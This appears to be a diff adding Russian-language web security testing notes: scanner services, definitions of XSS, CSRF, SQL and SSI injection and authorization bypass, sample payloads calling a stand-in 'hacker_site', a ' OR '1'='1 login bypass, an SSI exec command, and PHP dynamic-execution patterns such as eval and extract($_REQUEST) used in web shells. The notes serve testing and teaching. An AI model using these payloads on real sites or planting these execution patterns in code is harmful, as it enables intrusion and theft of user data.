@@ -14,7 +14,134 @@
 
 # Уровень защиты от DDOS-атак и при DDOS-атаках
 
+# Сервисы для проверки:
 
+Sucuri SiteCheck https://sitecheck.sucuri.net/
+Google Safe Browsing https://transparencyreport.google.com/safe-browsing/search
+Quttera http://quttera.com/
+Web Inspector https://www.webinspector.com/
+urlquery URL Scanner https://urlquery.net/
+Norton Safe Web https://safeweb.norton.com/
+VirusTotal https://www.virustotal.com/
 
+Malware Domain List
+PhishTank
+Comodo
 
+XSS (Cross-Site Scripting) - это вид уязвимости программного обеспечения (Web приложений), при которой, на генерированной сервером странице, выполняются вредоносные скрипты, с целью атаки клиента.
+XSRF / CSRF (Request Forgery) - это вид уязвимости, позволяющий использовать недостатки HTTP протокола, при этом злоумышленники работают по следующей схеме: ссылка на вредоносный сайт установливается на странице, пользующейся доверием у пользователя, при переходе по вредоносной ссылке выполняется скрипт, сохраняющий личные данные пользователя (пароли, платежные данные и т.д.), либо отправляющий СПАМ сообщения от лица пользователя, либо изменяет доступ к учетной записи пользователя, для получения полного контроля над ней.
+Code injections (SQL, PHP, ASP и т.д.) - это вид уязвимости, при котором становится возможно осуществить запуск исполняемого кода с целью получения доступа к системным ресурсам, несанкционированного доступа к данным либо выведения системы из строя.
+Server-Side Includes (SSI) Injection - это вид уязвимости, использующий вставку серверных команд в HTML код или запуск их напрямую с сервера.
+Authorization Bypass - это вид уязвимости, при котором возможно получить несанкционированный доступ к учетной записи или документам другого пользователя
+
+# XSS
+
+<script>alert(document.cookie);</script>
+<script>window.parent.location.href='http://hacker_site';</script>
+<object type="text/x-scriptlet" data="http://hacker_site"></object>
+
+# XSRF / CSRF (Request Forgery)
+
+Наиболее частыми CSRF атаками являются атаки использующие HTML <IMG> тэг или Javascript объект image. Чаще всего атакующий добавляет необходимый код в электронное письмо или выкладывает на веб-сайт, таким образом, что при загрузке страницы осуществляется запрос, выполняющий вредоносный код. Примеры:
+
+IMG SRC
+<img src="http://hacker_site/?command">
+
+SCRIPT SRC
+<script src="http://hacker_site/?command">
+
+Javascript объект Image
+<script>
+           var foo = new Image();
+           foo.src = "http://hacker_site/?command";
+</script>
+
+# Code injections (SQL, PHP, ASP и т.д.)
+
+Вставки исполняемого кода рассмотрим на примере кода SQL. Форма входа в систему имеет 2 поля - имя и пароль. Обработка происходит в базе данных через выполнение SQL запроса:
+
+SELECT Username
+FROM Users
+WHERE Name = 'tester'
+AND Password = 'testpass';
+
+Вводим корректное имя ’tester’, а в поле пароль вводим строку:
+
+testpass' OR '1'='1
+
+В итоге, Если поле не имеет соответствующих валидаций или обработчиков данных, может вскрыться уязвимость, позволяющая зайти в защищенную паролем систему, т.к.SQL запрос примет следующий вид:
+
+SELECT Username
+FROM Users
+WHERE Name = 'tester'
+AND Password = 'testpass' OR '1'='1';
+
+Условие '1'='1' всегда будет истинным и поэтому SQL запрос всегда будет возвращать много значений.
+
+# Server-Side Includes (SSI) Injection
+
+В зависимости от типа операционной системы команды могут быть разными, как пример рассмотрим команду, которая выводит на экран список файлов в OS Linux:
+
+< !--#exec cmd="ls" -->
+
+# Authorization Bypass
+
+Пользователь А может получить доступ к документам пользователя Б. Допустим, есть реализация, где при просмотре своего профиля, содержащего конфеденциальную информацию, в URL страницы передается userID, а данном случае есть смысл попробовать подставить вместо своего userID номер другого пользователя. И если вы увидите его данные, значит вы нашли дефект.
+
+# Вариант 1: косвенный вызов функции
+
+<?php 
+    $a = "var_dump";
+    $b = "Test";
+    $a($b);
+?>
+
+# Вариант 2: выполнение кода через eval
+
+<?php
+  eval('$a = "Test"; echo $a;');
+?>
+
+# Вариант 3: выполнение кода через assert
+
+<?php
+  assert('print("Test")');
+?>
+
+# Вариант 4: выполнение кода через array_map
+
+<?php
+  function evil($a) {
+    echo $a;
+  }
+  array_map('evil', array("Test"));
+?>
+
+# Вариант 5: выполнение кода через preg_replace('/.*/e')
+
+<?php
+  preg_replace('/.*/e', 'print("Test")', '');
+?>
+
+# Вариант 6: выполнение кода через preg_replace_callback
+
+<?php
+  $a = function () { echo "Test"; };
+  preg_replace_callback('/.*/', $a, ''); 
+?>
+
+# Вариант 7: выполнение кода через usort, uasort, uksort
+
+<?php
+  $a = function ($x, $y) { echo "Test"; };
+  $b = array(1 => '1', 2 => '2');
+  usort( $b, $a);
+?>
+
+# Вариант 8: скрытое объявление функций и передача параметров через extract
+
+<?php
+   extract($_REQUEST);
+   $a($b);
+?>
 
